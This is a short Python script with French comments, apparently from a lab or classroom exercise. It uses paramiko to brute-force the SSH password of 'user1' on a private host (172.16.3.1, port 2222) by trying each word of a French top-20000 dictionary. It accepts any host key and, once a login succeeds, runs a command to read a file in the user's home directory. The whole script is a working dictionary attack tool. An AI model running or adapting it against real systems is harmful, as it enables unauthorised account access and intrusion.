import paramiko
# https://www.paramiko.org/

# Infos
host="172.16.3.1"
username="user1"
password="user1"
port=2222

pirate=False

# Ouvrir le fichier en lecture seule
file = open("../Dictionnaire/fr-top20000.txt", "r")

# Utiliser readlines pour lire les lignes du fichier
# La variable "lignes" est une liste contenant toutes les lignes du fichier
lines = file.readlines()

inverted_lines = list(reversed(lines))

# Fermer le fichier après avoir lu les lignes
file.close()

# Index
index=1

# Itérer sur les lignes
for line in inverted_lines:
    print (line.strip())    # Juste pour le test # Strip pour enlever le saut de ligne

    # Password en cours
    password=line.strip()

    try:
        # Connexion
        client = paramiko.client.SSHClient()
        # Set the policy to accept any host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print ("Tentative: ", index, " Mot de passe tenté: ", password)

        client.connect(host, username=username, password=password, port=port)
        pirate=True

    except:
        pirate=False
        client.close()

    if pirate:
        command = "cat ~/fenelon.txt" # On peut voir la liste des utilisateurs sur la machine
        _stdin, _stdout, _stderr = client.exec_command(command)
        print ("    Mot de passe trouvé!: ", password)
        print( _stdout.read().decode() )

    # Incrementation
    index=index+1

    client.close()